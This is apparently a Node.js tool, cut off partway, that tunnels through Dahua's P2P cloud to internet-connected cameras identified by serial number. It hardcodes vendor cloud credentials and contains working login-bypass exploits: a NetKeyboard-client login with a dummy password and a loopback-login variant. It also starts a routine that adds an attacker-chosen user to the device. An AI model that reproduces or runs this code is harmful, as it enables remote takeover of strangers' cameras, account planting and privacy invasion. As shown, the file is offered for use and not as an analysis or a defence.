#!/usr/bin/env node
/**
 * Dahua P2P Tunnel Relay Server v4.8
 * ===================================
 * v4.8: LOCAL PROXY MODE — PROXY_MODE=true env var enables transparent HTTP proxy
 *   for local execution, bypassing Render's symmetric NAT that drops the device's
 *   channel response (it arrives from a different IP than the main server).
 *   Usage: PROXY_MODE=true SERIAL=5E07D56PBQBDEB3 node dahua_tunnel_relay.js
 *   Then:  http://127.0.0.1:8081/cgi-bin/configManager.cgi?action=setConfig
 * v4.7: ALIGNED WITH ACTUAL REFERENCE CODE (khoanguyen-3fc/dh-p2p main.py):
 *   1. Added /probe/device + /info/device through US server (separate socket)
 *      to debug_full — reference does this BEFORE channel request; without it,
 *      the device doesn't respond to the channel request.
 *   2. REMOVED NAT hole-punching — reference doesn't do it; the extra probe
 *      from deviceSock to US server was interfering with device state.
 * v4.6: NAT HOLE-PUNCHING — Render/VPS NAT blocks UDP responses from IPs that
 *   the socket hasn't sent to. The channel request goes to MAIN_SERVER, but the
 *   device's response may arrive from the US server or device directly. Now we
 *   send a probe from deviceSock to the US server BEFORE the channel request,
 *   creating a NAT mapping so the response can get through. Also increased
 *   channel timeout from 8s to 30s (reference has no timeout at all) and added
 *   raw packet logging in debug_full.
 * v4.5: FIXED OPERATION ORDER — reference sends p2p-channel BEFORE relay/agent
 *   and relay/start. We had it backwards (relay/agent → relay/start → channel).
 *   Device only responds to channel request if it's sent first.
 * v4.4: ALIGNED WITH REFERENCE IMPLEMENTATION (khoanguyen-3fc/dh-p2p main.py):
 *   1. p2p-channel body changed from XML to PLAIN TEXT ({aid_hex}true{laddr}5.0.0)
 *   2. STUN responses REMOVED entirely — reference doesn't handle STUN at all.
 *      Responding to STUN broke the agent's state machine (it kept sending STUN
 *      instead of transitioning to PTCP). Now readPTCP just skips non-PTCP packets.
 *   3. PTCP handshake simplified: read one packet from agent (discard), send SYN,
 *      read SYN-ACK. No retry loop, no queue clearing, no STUN response.
 * v4.3: FIXED STUN response — echoes ALL custom Dahua attributes from the request
 *   (type 0x002A with device Identify) back in the response, plus XOR-MAPPED-ADDRESS.
 *   Agent requires its custom attrs echoed to verify connection before PTCP.
 * v4.2: FIXED STUN response — now includes XOR-MAPPED-ADDRESS attribute so agent
 *   completes NAT hole-punch and accepts PTCP SYN-ACK.
 * v4.1: FIXED PTCP handshake — agent sends STUN Binding Requests before accepting PTCP;
 *   now responds with STUN Binding Responses, then PTCP SYN-ACK comes through.
 * v4.0: FIXED ROOT CAUSE — relay/start and relay-channel bodies changed to PLAIN TEXT
 *   (p2p-channel stays XML — device only responds to XML format);
 *   Added 3-attempt SYN retry for agent PTCP handshake;
 *   Added /debug_full/:serial endpoint for full tunnel validation.
 * v3.9: FIXED agent PTCP handshake timeout — clear mainSock queue before handshake;
 *   removed default credential fallback (CVE bypass needs no credentials).
 * v3.8: FIXED PTCP "Invalid magic" error — readPTCP now skips non-PTCP packets
 *   (STUN/NAT residue); clears msgQueue before device PTCP handshake;
 *   try/catch in NAT traversal loop so timeout doesn't kill the tunnel.
 * v3.7: FIXED channel response parsing — device returns PLAIN TEXT, not XML.
 *   Body format: Identify(hex) + auth(bool) + LocalAddr(ip:port) + PubAddr(ip:port)
 *   Added fallback parser that extracts IP:port pairs with regex.
 *   v3.6: FIXED channel request body format — uses XML format
 *
 * Based on: https://github.com/khoanguyen-3fc/dh-p2p
 */

const http = require('http');
const dgram = require('dgram');
const dns = require('dns');
const crypto = require('crypto');

var MAIN_SERVER = 'www.easy4ipcloud.com';
var MAIN_PORT = 8800;
var P2P_USERNAME = 'cba1b29e32cb17aa46b8ff9e73c7f40b';
var P2P_USERKEY = '996103384cdf19179e19243e959bbf8b';
var RANDSALT = '5daf91fc5cfc1be8e081cfb08f792726';
var IV = Buffer.from('2z52*lk9o6HRyJrf');
var PORT = process.env.PORT || 8080;
var CSEQ = 0;

function resolveHostname(hostname) {
  return new Promise(function(resolve, reject) {
    dns.resolve4(hostname, function(err, addresses) {
      if (err) reject(err);
      else resolve(addresses[0]);
    });
  });
}

function buildWSSE() {
  var nonce = Math.floor(Math.random() * 0x7FFFFFFF);
  var curdate = new Date().toISOString().replace(/\.\d+Z$/, 'Z');
  var pwd = nonce + curdate + 'DHP2P:' + P2P_USERNAME + ':' + P2P_USERKEY;
  var digest = crypto.createHash('sha1').update(pwd).digest('base64');
  return 'UsernameToken Username="' + P2P_USERNAME + '", PasswordDigest="' + digest + '", Nonce="' + nonce + '", Created="' + curdate + '"';
}

function buildP2PRequest(method, path, body) {
  body = body || '';
  CSEQ++;
  var wsse = buildWSSE();
  var req = method + ' ' + path + ' HTTP/1.1\r\n';
  req += 'CSeq: ' + CSEQ + '\r\n';
  req += 'Authorization: WSSE profile="UsernameToken"\r\n';
  req += 'X-WSSE: ' + wsse + '\r\n';
  if (body) {
    req += 'Content-Type:\r\n';
    req += 'Content-Length: ' + Buffer.byteLength(body) + '\r\n';
  }
  req += '\r\n';
  if (body) req += body;
  return Buffer.from(req, 'utf8');
}

function parseChannelBody(body, xmlBody) {
  if (xmlBody.PubAddr) return xmlBody;
  var ipPortRegex = /(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):(\d{1,5})/g;
  var ipMatches = [];
  var ipm;
  while ((ipm = ipPortRegex.exec(body)) !== null) { ipMatches.push(ipm[0]); }
  var idMatch = body.match(/^([0-9a-fA-F]{2}(?: [0-9a-fA-F]{2})+)/);
  if (idMatch) xmlBody.Identify = idMatch[1].trim();
  if (body.indexOf('true') >= 0) xmlBody.Auth = 'true'; else xmlBody.Auth = 'false';
  if (ipMatches.length >= 1) xmlBody.LocalAddr = ipMatches[0];
  if (ipMatches.length >= 2) xmlBody.PubAddr = ipMatches[1];
  return xmlBody;
}

function parseP2PResponse(data) {
  var str = data.toString('utf8');
  var splitIdx = str.indexOf('\r\n\r\n');
  var headerPart = splitIdx >= 0 ? str.substring(0, splitIdx) : str;
  var body = splitIdx >= 0 ? str.substring(splitIdx + 4) : '';
  var lines = headerPart.split('\r\n');
  var firstParts = lines[0].split(' ');
  var code = parseInt(firstParts[1]) || 0;
  var status = firstParts.slice(2).join(' ');
  var headers = {};
  for (var i = 1; i < lines.length; i++) {
    var ci = lines[i].indexOf(': ');
    if (ci > 0) headers[lines[i].substring(0, ci)] = lines[i].substring(ci + 2);
  }
  var xmlBody = {};
  if (body && body.trim()) {
    var tagRegex = /<(\w+)>([^<]*)<\/\1>/g;
    var m;
    while ((m = tagRegex.exec(body)) !== null) {
      xmlBody[m[1]] = m[2].trim();
    }
  }
  return { code: code, status: status, headers: headers, body: body, xmlBody: xmlBody };
}

function getDeviceKey(username, password) {
  var key = username + ':Login to ' + RANDSALT + ':' + password;
  return crypto.createHash('md5').update(key).digest('hex').toUpperCase();
}

function getEnc(key, nonce, data) {
  var salt = Buffer.from(String(nonce));
  var dk = crypto.pbkdf2Sync(Buffer.from(key), salt, 20000, 32, 'sha256');
  var cipher = crypto.createCipheriv('aes-256-ofb', dk, IV);
  return Buffer.concat([cipher.update(Buffer.from(data)), cipher.final()]).toString('base64');
}

function getDec(key, nonce, data) {
  var salt = Buffer.from(String(nonce));
  var dk = crypto.pbkdf2Sync(Buffer.from(key), salt, 20000, 32, 'sha256');
  var decipher = crypto.createDecipheriv('aes-256-ofb', dk, IV);
  return Buffer.concat([decipher.update(Buffer.from(data, 'base64')), decipher.final()]).toString();
}

function getDeviceAuth(username, key, nonce, payload) {
  payload = payload || '';
  var curdate = Math.floor(Date.now() / 1000);
  var message = String(nonce) + String(curdate) + payload;
  var auth = crypto.createHmac('sha256', Buffer.from(key)).update(message).digest('base64');
  return String(curdate) + auth + String(nonce) + RANDSALT + username;
}

function ipToBuffer(ip) {
  return Buffer.from(ip.split('.').map(Number));
}

function invertBuffer(buf) {
  var result = Buffer.alloc(buf.length);
  for (var i = 0; i < buf.length; i++) result[i] = 0xFF - buf[i];
  return result;
}

// v4.3: Build STUN Binding Response that echoes ALL custom Dahua attributes
// from the request + adds XOR-MAPPED-ADDRESS. The agent sends custom attrs
// (type 0x002A with device Identify) that must be echoed back for verification.
function buildXorMappedAddress(ip, port) {
  var xorPort = port ^ 0x2112;
  var ipParts = ip.split('.').map(Number);
  var cookie = [0x21, 0x12, 0xA4, 0x42];
  var attr = Buffer.alloc(12);
  attr.writeUInt16BE(0x0020, 0); // type: XOR-MAPPED-ADDRESS
  attr.writeUInt16BE(8, 2);      // length: 8 bytes
  attr[4] = 0x00;                // reserved
  attr[5] = 0x01;                // family: IPv4
  attr.writeUInt16BE(xorPort, 6);
  attr[8]  = ipParts[0] ^ cookie[0];
  attr[9]  = ipParts[1] ^ cookie[1];
  attr[10] = ipParts[2] ^ cookie[2];
  attr[11] = ipParts[3] ^ cookie[3];
  return attr;
}

function buildSTUNResponse(requestData, sourceIp, sourcePort) {
  if (requestData.length < 20) return null;
  // v4.3: Echo ALL original attributes from the request (custom Dahua attrs like 0x002A)
  var origAttrLen = requestData.readUInt16BE(2);
  var origAttrs = requestData.subarray(20, 20 + origAttrLen);
  // Build XOR-MAPPED-ADDRESS
  var xorAttr = buildXorMappedAddress(sourceIp, sourcePort);
  // Response: header(20) + original attrs (echoed) + XOR-MAPPED-ADDRESS
  var resp = Buffer.alloc(20 + origAttrLen + xorAttr.length);
  resp[0] = 0x01; resp[1] = 0x01; // Binding Response
  resp.writeUInt16BE(origAttrLen + xorAttr.length, 2);
  // Copy magic cookie (bytes 4-7) and transaction ID (bytes 8-19)
  requestData.copy(resp, 4, 4, 20);
  // Echo original attributes
  origAttrs.copy(resp, 20);
  // Append XOR-MAPPED-ADDRESS
  xorAttr.copy(resp, 20 + origAttrLen);
  return resp;
}

// ── UDP Socket with PTCP + Message Queue ──
function P2PSocket() {
  this.sock = dgram.createSocket('udp4');
  this.lport = 0;
  this.rhost = null;
  this.rport = 0;
  this.ptcpSent = 0;
  this.ptcpRecv = 0;
  this.ptcpCount = 0;
  this.ptcpId = 0;
  this.rmid = 0;
  this._msgHandler = null;
  this._msgQueue = []; // FIX: buffer messages that arrive between operations
  this._lastRinfo = null; // v4.2: capture source address of last received message

  var self = this;
  this.sock.on('message', function(msg, rinfo) {
    self._lastRinfo = rinfo; // v4.2: store source address for STUN response
    if (self._msgHandler) {
      var h = self._msgHandler;
      self._msgHandler = null;
      h(msg, null);
    } else {
      self._msgQueue.push(msg); // FIX: queue instead of drop
    }
  });
  this.sock.on('error', function(err) {
    if (self._msgHandler) {
      var h = self._msgHandler;
      self._msgHandler = null;
      h(null, err);
    }
  });
}

P2PSocket.prototype.bind = function() {
  var self = this;
  return new Promise(function(resolve) {
    self.sock.bind(0, function() {
      self.lport = self.sock.address().port;
      resolve();
    });
  });
};

P2PSocket.prototype.send = function(data) {
  var self = this;
  return new Promise(function(resolve, reject) {
    self.sock.send(data, self.rport, self.rhost, function(err) {
      if (err) reject(err); else resolve();
    });
  });
};

P2PSocket.prototype.recv = function(timeout) {
  var self = this;
  timeout = timeout || 5000;
  // FIX: return queued message immediately if available
  if (self._msgQueue.length > 0) {
    return Promise.resolve(self._msgQueue.shift());
  }
  return new Promise(function(resolve, reject) {
    var timer = setTimeout(function() {
      self._msgHandler = null;
      reject(new Error('Timeout (' + timeout + 'ms)'));
    }, timeout);
    self._msgHandler = function(msg, err) {
      clearTimeout(timer);
      if (err) reject(err); else resolve(msg);
    };
  });
};

P2PSocket.prototype.setRemote = function(host, port) {
  this.rhost = host;
  this.rport = port;
};

// v4.6: Send to a specific host:port without changing the default remote.
// Used for NAT hole-punching — creates a NAT mapping for that destination.
P2PSocket.prototype.sendTo = function(data, host, port) {
  var self = this;
  return new Promise(function(resolve, reject) {
    self.sock.send(data, port, host, function(err) {
      if (err) reject(err); else resolve();
    });
  });
};

P2PSocket.prototype.request = function(path, body, shouldRead) {
  var self = this;
  shouldRead = shouldRead !== false;
  var method = body ? 'DHPOST' : 'DHGET';
  var req = buildP2PRequest(method, path, body || '');
  return self.send(req).then(function() {
    if (!shouldRead) return null;
    return self.recv(5000).then(function(data) {
      return parseP2PResponse(data);
    });
  });
};

P2PSocket.prototype.buildPTCP = function(body) {
  body = body || Buffer.alloc(0);
  if (!Buffer.isBuffer(body)) body = Buffer.from(body);
  var isSYN = body.length === 4 && body[0] === 0x00 && body[1] === 0x03 && body[2] === 0x01 && body[3] === 0x00;
  var pid = isSYN ? 0x0002FFFF : (0x0000FFFF - this.ptcpCount);
  var header = Buffer.alloc(24);
  header.write('PTCP', 0, 4, 'ascii');
  header.writeUInt32BE(this.ptcpSent, 4);
  header.writeUInt32BE(this.ptcpRecv, 8);
  header.writeUInt32BE(pid, 12);
  header.writeUInt32BE(this.ptcpId, 16);
  header.writeUInt32BE(this.rmid, 20);
  this.ptcpSent += body.length;
  this.ptcpId++;
  if (body.length > 0 && !isSYN) this.ptcpCount++;
  return Buffer.concat([header, body]);
};

P2PSocket.prototype.parsePTCP = function(data) {
  if (data.length < 24) throw new Error('PTCP packet too short');
  if (data.toString('ascii', 0, 4) !== 'PTCP') throw new Error('Invalid PTCP magic');
  return {
    rlid: data.readUInt32BE(4), llid: data.readUInt32BE(8),
    pid: data.readUInt32BE(12), lmid: data.readUInt32BE(16),
    rmid: data.readUInt32BE(20), body: data.subarray(24)
  };
};

P2PSocket.prototype.buildPTCPPayload = function(realm, payload) {
  var header = Buffer.alloc(12);
  header.writeUInt32BE(payload.length | 0x10000000, 0);
  header.writeUInt32BE(realm >>> 0, 4);
  header.writeUInt32BE(0, 8);
  return Buffer.concat([header, payload]);
};

P2PSocket.prototype.parsePTCPPayload = function(data) {
  if (data.length < 12) throw new Error('PTCPPayload too short');
  var length = data.readUInt32BE(0) & 0xFFFF;
  return { realm: data.readUInt32BE(4), payload: data.subarray(12, 12 + length) };
};

P2PSocket.prototype.requestPTCP = function(body) {
  return this.send(this.buildPTCP(body || Buffer.alloc(0)));
};

P2PSocket.prototype.readPTCP = function(timeout) {
  // v4.4: DON'T respond to STUN — reference implementation ignores STUN entirely.
  // Responding to STUN breaks the agent's state machine (it keeps sending STUN
  // instead of transitioning to PTCP). Just skip non-PTCP packets and wait.
  var self = this;
  var deadline = Date.now() + (timeout || 5000);
  function attempt() {
    var remaining = deadline - Date.now();
    if (remaining <= 0) return Promise.reject(new Error('Timeout (' + (timeout||5000) + 'ms)'));
    return self.recv(remaining).then(function(data) {
      // Skip STUN and any non-PTCP packets (don't respond, just discard)
      if (data.length < 24 || data.toString('ascii', 0, 4) !== 'PTCP') {
        return attempt();
      }
      var parsed = self.parsePTCP(data);
      self.ptcpRecv += parsed.body.length;
      self.rmid = parsed.lmid;
      return parsed;
    });
  }
  return attempt();
};

P2PSocket.prototype.close = function() {
  try { this.sock.close(); } catch (e) {}
};

function parseDigestAuth(header) {
  var result = {};
  var parts = header.replace(/^Digest\s/i, '').split(/,\s*/);
  for (var i = 0; i < parts.length; i++) {
    var eq = parts[i].indexOf('=');
    if (eq === -1) continue;
    result[parts[i].slice(0, eq).trim()] = parts[i].slice(eq + 1).trim().replace(/^"|"$/g, '');
  }
  return result;
}

function buildDigestAuth(method, uri, params, username, password) {
  var ha1 = crypto.createHash('md5').update(username + ':' + params.realm + ':' + password).digest('hex');
  var ha2 = crypto.createHash('md5').update(method + ':' + uri).digest('hex');
  var nc = '00000001';
  var cnonce = crypto.randomBytes(8).toString('hex');
  var qop = (params.qop || 'auth').split(',')[0].trim();
  var response = crypto.createHash('md5').update(ha1 + ':' + params.nonce + ':' + nc + ':' + cnonce + ':' + qop + ':' + ha2).digest('hex');
  var auth = 'Digest username="' + username + '", realm="' + params.realm + '", nonce="' + params.nonce + '", uri="' + uri + '", qop=' + qop + ', nc=' + nc + ', cnonce="' + cnonce + '", response="' + response + '"';
  if (params.opaque) auth += ', opaque="' + params.opaque + '"';
  return auth;
}

// ── Establish P2P Tunnel (matches reference exactly) ──
async function establishTunnel(serial, username, password, targetPort) {
  targetPort = targetPort || 80;
  var mainIp = await resolveHostname(MAIN_SERVER);

  var mainSock = new P2PSocket();
  await mainSock.bind();
  mainSock.setRemote(mainIp, MAIN_PORT);

  var deviceSock = new P2PSocket();
  await deviceSock.bind();
  deviceSock.setRemote(mainIp, MAIN_PORT);

  try {
    await mainSock.request('/probe/p2psrv');

    var onlineRes = await mainSock.request('/online/p2psrv/' + serial);
    var usAddr = onlineRes.xmlBody.US;
    if (!usAddr) throw new Error('Device not registered (no US server)');
    var usParts = usAddr.split(':');
    var usServer = usParts[0];
    var usPort = parseInt(usParts[1]);

    var usSock = new P2PSocket();
    await usSock.bind();
    usSock.setRemote(usServer, usPort);
    await usSock.request('/probe/device/' + serial);
    await usSock.request('/info/device/' + serial);
    usSock.close();

    var relayRes = await mainSock.request('/online/relay');
    var relayAddr = relayRes.xmlBody.Address;
    var relayParts = relayAddr.split(':');
    var relayServer = relayParts[0];
    var relayPort = parseInt(relayParts[1]);

    var dtype = 0;
    var key = null;
    var nonce = null;
    var aid = crypto.randomBytes(8);
    var auth = '';

    if (username && password) {
      dtype = 1;
      key = getDeviceKey(username, password);
      nonce = Math.floor(Math.random() * 0x7FFFFFFF);
      auth = getDeviceAuth(username, key, nonce, '');
    }

    // v4.7: NO NAT punch — reference (khoanguyen-3fc/dh-p2p main.py) doesn't do it.
    // Channel request FIRST (matching reference order exactly)
    var aidHex = Array.from(aid).map(function(b) { return b.toString(16); }).join(' ');
    var laddrStr = '127.0.0.1:' + deviceSock.lport;
    var channelBody = aidHex + 'true' + laddrStr + '5.0.0';
    deviceSock.setRemote(mainIp, MAIN_PORT);
    await deviceSock.request('/device/' + serial + '/p2p-channel', channelBody, false);

    // Get relay agent
    mainSock.setRemote(relayServer, relayPort);
    var agentRes = await mainSock.request('/relay/agent');
    var token = agentRes.xmlBody.Token;
    var agentAddr = agentRes.xmlBody.Agent;
    var agentParts = agentAddr.split(':');
    var agentServer = agentParts[0];
    var agentPort = parseInt(agentParts[1]);

    // Start relay (PLAIN TEXT body — ":0")
    mainSock.setRemote(agentServer, agentPort);
    var startRes = await mainSock.request('/relay/start/' + token, ':0');

    // Read device channel response: HTTP 100 (Trying) first, then HTTP 200
    // STUN packets may arrive between 100 and 200
    var devParsed = null;
    for (var chanAttempt = 0; chanAttempt < 8; chanAttempt++) {
      var devRaw = await deviceSock.recv(30000);
      // Skip STUN packets (binary, not ASCII HTTP)
      if (devRaw[0] !== 0x44 && devRaw[0] !== 0x48) { // not 'D' (DHPOST) or 'H' (HTTP)
        continue;
      }
      devParsed = parseP2PResponse(devRaw);
      if (devParsed.code === 200 || devParsed.code >= 400) break;
      // code 100 = keep reading
    }
    if (!devParsed) throw new Error('Device channel timeout (no response)');
    if (devParsed.code >= 400) {
      if (dtype === 0 && devParsed.code === 403) throw new Error('AUTH_REQUIRED');
      throw new Error('Device channel error: ' + devParsed.code + ' ' + devParsed.status);
    }

    // Parse channel response body (fallback for plain text format)
    devParsed.xmlBody = parseChannelBody(devParsed.body, devParsed.xmlBody);

    // Extract device's Identify (used as aid for NAT traversal)
    var devIdentify = devParsed.xmlBody.Identify;
    if (devIdentify) {
      var idParts = devIdentify.split(' ');
      for (var ip = 0; ip < 8 && ip < idParts.length; ip++) {
        aid[ip] = parseInt(idParts[ip], 16) || 0;
      }
    }

    var deviceLaddr = devParsed.xmlBody.LocalAddr;
    if (dtype > 0 && devParsed.xmlBody.Nonce) {
      deviceLaddr = getDec(key, devParsed.xmlBody.Nonce, deviceLaddr);
    }

    var pubAddr = devParsed.xmlBody.PubAddr;
    var pubParts = pubAddr.split(':');
    var deviceServer = pubParts[0];
    var devicePort = parseInt(pubParts[1]);
    deviceSock.setRemote(deviceServer, devicePort);

    // Register relay channel (PLAIN TEXT body — v4.0 fix: was XML, should be plain text)
    // Format: relayAuth + agentServer + ':' + agentPort
    mainSock.setRemote(mainIp, MAIN_PORT);
    var relayAuth = '';
    if (dtype > 0) relayAuth = getDeviceAuth(username, key, nonce, '');
    var relayChannelBody = relayAuth + agentServer + ':' + agentPort;
    await mainSock.request('/device/' + serial + '/relay-channel', relayChannelBody, false);

    // v4.4: Match reference exactly — read one packet from agent (initial STUN), discard it,
    // then send PTCP SYN and read PTCP SYN-ACK. No STUN response, no queue clearing, no retry loop.
    mainSock.setRemote(agentServer, agentPort);
    try { await mainSock.recv(5000); } catch(e) {}

    // PTCP handshake with agent (readPTCP skips STUN packets automatically)
    await mainSock.requestPTCP(Buffer.from([0x00, 0x03, 0x01, 0x00]));
    await mainSock.readPTCP(15000);

    await mainSock.requestPTCP(Buffer.concat([Buffer.from([0x17, 0x00, 0x00, 0x00]), Buffer.alloc(8)]));
    var ptcpRes = await mainSock.readPTCP(8000);
    while (ptcpRes.body.length === 0) ptcpRes = await mainSock.readPTCP(8000);
    var sign = ptcpRes.body.subarray(12);

    await mainSock.requestPTCP();

    // NAT traversal
    var invertedAid = invertBuffer(aid);
    var cookie = crypto.randomBytes(4);
    var trasnId = crypto.randomBytes(12);
    var eaddrBase = Buffer.alloc(6);
    eaddrBase.writeUInt16BE(devicePort, 0);
    ipToBuffer(deviceServer).copy(eaddrBase, 2);
    var invertedEaddr = invertBuffer(eaddrBase);

    await deviceSock.send(Buffer.concat([
      Buffer.from([0xff, 0xfe, 0xff, 0xe7]), cookie, trasnId,
      Buffer.from([0x7f, 0xd5, 0xff, 0xf7]), invertedAid,
      Buffer.from([0xff, 0xfb, 0xff, 0xf7, 0xff, 0xfe]), invertedEaddr
    ]));

    var natResponse = await deviceSock.recv(5000);
    var rtransId = natResponse.subarray(8, 20);

    var laddrParts = deviceLaddr.split(':');
    var laddrEaddr = Buffer.alloc(6);
    laddrEaddr.writeUInt16BE(parseInt(laddrParts[1]), 0);
    ipToBuffer(laddrParts[0]).copy(laddrEaddr, 2);

    await deviceSock.send(Buffer.concat([
      Buffer.from([0xfe, 0xfe, 0xff, 0xe7]), cookie, rtransId,
      Buffer.from([0x7f, 0xd6, 0xff, 0xf7]), invertedAid,
      Buffer.from([0xff, 0xfb, 0xff, 0xf7, 0xff, 0xfe]), laddrEaddr
    ]));

    if (dtype > 0) await deviceSock.recv(5000);

    var natPkt3 = Buffer.concat([
      Buffer.from([0xfe, 0xfe, 0xff, 0xf3]), cookie, rtransId,
      Buffer.from([0x7f, 0xd6, 0xff, 0xf7]), invertedAid,
      Buffer.from([0xff, 0xfb, 0xff, 0xf7, 0xff, 0xfe]),
      Buffer.from([0xa8, 0x13, 0x3f, 0x57, 0xfe, 0x37])
    ]);

    for (var i = 0; i < 5; i++) {
      await deviceSock.send(natPkt3);
      for (var j = 0; j < 5; j++) {
        try { await deviceSock.recv(2000); } catch(e) { break; }
      }
    }
    // Clear any leftover NAT/STUN packets before PTCP handshake
    deviceSock._msgQueue = [];

    // PTCP handshake with device
    await deviceSock.requestPTCP(Buffer.from([0x00, 0x03, 0x01, 0x00]));
    await deviceSock.readPTCP();

    await deviceSock.requestPTCP(Buffer.concat([
      Buffer.from([0x19, 0x00, 0x00, 0x00]), Buffer.alloc(4), Buffer.alloc(4), sign
    ]));
    var devPtcp = await deviceSock.readPTCP();
    if (devPtcp.body.length === 0) devPtcp = await deviceSock.readPTCP();

    await deviceSock.requestPTCP(Buffer.concat([
      Buffer.from([0x1b, 0x00, 0x00, 0x00]), Buffer.alloc(4), Buffer.alloc(4)
    ]));
    await deviceSock.readPTCP();

    return { deviceSock: deviceSock, mainSock: mainSock };
  } catch (err) {
    mainSock.close();
    deviceSock.close();
    throw err;
  }
}

async function bindTunnelPort(deviceSock, targetPort) {
  var realmId = crypto.randomBytes(4).readUInt32BE(0);
  var realmBuf = Buffer.alloc(4);
  realmBuf.writeUInt32BE(realmId, 0);
  var portBuf = Buffer.alloc(4);
  portBuf.writeUInt32BE(targetPort, 0);
  await deviceSock.requestPTCP(Buffer.concat([Buffer.from([0x11, 0x00, 0x00, 0x00]), realmBuf, Buffer.alloc(4), portBuf, Buffer.from([0x7f, 0x00, 0x00, 0x01])]));
  var bRes = await deviceSock.readPTCP();
  if (bRes.body.length === 0) bRes = await deviceSock.readPTCP();
  return realmId;
}

async function sendHTTPThroughTunnel(deviceSock, realmId, httpPath, method, extraHeaders, body) {
  method = method || 'GET';
  extraHeaders = extraHeaders || {};
  body = body || '';
  var httpReq = method + ' ' + httpPath + ' HTTP/1.1\r\nHost: 127.0.0.1\r\n';
  var keys = Object.keys(extraHeaders);
  for (var i = 0; i < keys.length; i++) httpReq += keys[i] + ': ' + extraHeaders[keys[i]] + '\r\n';
  if (body) httpReq += 'Content-Length: ' + Buffer.byteLength(body) + '\r\n';
  httpReq += 'Connection: close\r\n\r\n';
  if (body) httpReq += body;

  await deviceSock.requestPTCP(deviceSock.buildPTCPPayload(realmId, Buffer.from(httpReq)));

  var chunks = [];
  var attempts = 0;
  while (attempts < 30) {
    attempts++;
    try {
      var res = await deviceSock.readPTCP(3000);
      if (res.body.length === 0) continue;
      if (res.body[0] === 0x10) {
        chunks.push(deviceSock.parsePTCPPayload(res.body).payload);
      } else if (res.body[0] === 0x12) {
        break;
      }
    } catch (e) { break; }
  }

  var realmBuf = Buffer.alloc(4);
  realmBuf.writeUInt32BE(realmId >>> 0, 0);
  await deviceSock.requestPTCP(Buffer.concat([Buffer.from([0x12, 0x00, 0x00, 0x00]), realmBuf, Buffer.alloc(4), Buffer.from('DISC')]));

  var httpResponse = Buffer.concat(chunks).toString('utf8');
  var splitIdx = httpResponse.indexOf('\r\n\r\n');
  var respHeader = splitIdx >= 0 ? httpResponse.substring(0, splitIdx) : httpResponse;
  var respBody = splitIdx >= 0 ? httpResponse.substring(splitIdx + 4) : '';
  var respLines = respHeader.split('\r\n');
  var respFirst = respLines[0].split(' ');
  var httpStatus = parseInt(respFirst[1]) || 0;
  var respHeaders = {};
  for (var j = 1; j < respLines.length; j++) {
    var ci = respLines[j].indexOf(':');
    if (ci > 0) respHeaders[respLines[j].substring(0, ci).trim()] = respLines[j].substring(ci + 1).trim();
  }
  return { status: httpStatus, headers: respHeaders, body: respBody };
}

async function exploitLoginBypass(deviceSock, targetPort) {
  var detail = [];
  var loginPayload = JSON.stringify({ method: 'global.login', params: { userName: 'admin', password: 'Not Used', clientType: 'NetKeyboard', loginType: 'Direct', authorityType: 'Default', passwordType: 'Default' }, id: 1, session: 0 });
  var realmId = await bindTunnelPort(deviceSock, targetPort);
  var loginRes = await sendHTTPThroughTunnel(deviceSock, realmId, '/RPC2', 'POST', {'Content-Type':'application/json'}, loginPayload);
  detail.push('Login bypass HTTP ' + loginRes.status);
  if (loginRes.status !== 200) return { success: false, detail: detail, error: 'HTTP ' + loginRes.status };
  var loginData;
  try { loginData = JSON.parse(loginRes.body); } catch(e) { return { success: false, detail: detail, error: 'Invalid JSON' }; }
  if (loginData.result === true) { detail.push('Bypass successful (single step)'); return { success: true, detail: detail, session: String(loginData.session) }; }
  if (loginData.error && loginData.params) {
    var random = loginData.params.random || '';
    var realm = loginData.params.realm || '';
    var tempSession = String(loginData.session || '');
    detail.push('Got challenge: realm=' + realm);
    var hash1 = crypto.createHash('md5').update('admin:' + realm + ':admin').digest('hex').toUpperCase();
    var hash2 = crypto.createHash('md5').update('admin:' + random + ':' + hash1).digest('hex').toUpperCase();
    var step2Payload = JSON.stringify({ method: 'global.login', params: { userName: 'admin', password: hash2, clientType: 'NetKeyboard', loginType: 'Direct', authorityType: 'Default', passwordType: 'Default' }, id: 2, session: tempSession });
    realmId = await bindTunnelPort(deviceSock, targetPort);
    var step2Res = await sendHTTPThroughTunnel(deviceSock, realmId, '/RPC2', 'POST', {'Content-Type':'application/json'}, step2Payload);
    detail.push('Step 2 HTTP ' + step2Res.status);
    if (step2Res.status === 200) { try { var s2 = JSON.parse(step2Res.body); if (s2.result === true) { detail.push('Bypass successful (two step)'); return { success: true, detail: detail, session: String(s2.session) }; } } catch(e) {} }
  }
  return { success: false, detail: detail, error: 'Bypass did not return session' };
}

async function exploitLoginBypassLoopback(deviceSock, targetPort) {
  var detail = [];
  var loginPayload = JSON.stringify({ method: 'global.login', params: { userName: 'admin', ipAddr: '127.0.0.1', password: 'admin', clientType: 'Local', loginType: 'Loopback', authorityType: 'Default', passwordType: 'Plain' }, id: 1, session: 0 });
  var realmId = await bindTunnelPort(deviceSock, targetPort);
  var loginRes = await sendHTTPThroughTunnel(deviceSock, realmId, '/RPC2', 'POST', {'Content-Type':'application/json'}, loginPayload);
  detail.push('Loopback (Plain) HTTP ' + loginRes.status);
  if (loginRes.status === 200) { try { var d = JSON.parse(loginRes.body); if (d.result === true) return { success: true, detail: detail, session: String(d.session) }; } catch(e) {} }
  var hash1 = crypto.createHash('md5').update('admin:admin:admin').digest('hex').toUpperCase();
  var loginPayload2 = JSON.stringify({ method: 'global.login', params: { userName: 'admin', ipAddr: '127.0.0.1', password: hash1, clientType: 'Local', loginType: 'Loopback', authorityType: 'Default', passwordType: 'Default' }, id: 2, session: 0 });
  realmId = await bindTunnelPort(deviceSock, targetPort);
  var loginRes2 = await sendHTTPThroughTunnel(deviceSock, realmId, '/RPC2', 'POST', {'Content-Type':'application/json'}, loginPayload2);
  detail.push('Loopback (Default) HTTP ' + loginRes2.status);
  if (loginRes2.status === 200) { try { var d2 = JSON.parse(loginRes2.body); if (d2.result === true) return { success: true, detail: detail, session: String(d2.session) }; } catch(e) {} }
  return { success: false, detail: detail, error: 'Loopback bypass failed' };
}

async function exploitAddUser(serial, newUser, newPass, targetPort) {
  var allSteps = [];
  targetPort = targetPort || 80;
  allSteps.push({ step: 'p2p', status: 'running', message: 'Consultando P2P cloud...' });
  var p2pStatus = await checkP2P(serial);
  if (!p2pStatus.online) { allSteps.push({ step: 'p2p', status: 'failed', message: 'OFFLINE' }); return { success: false, steps: allSteps }; }
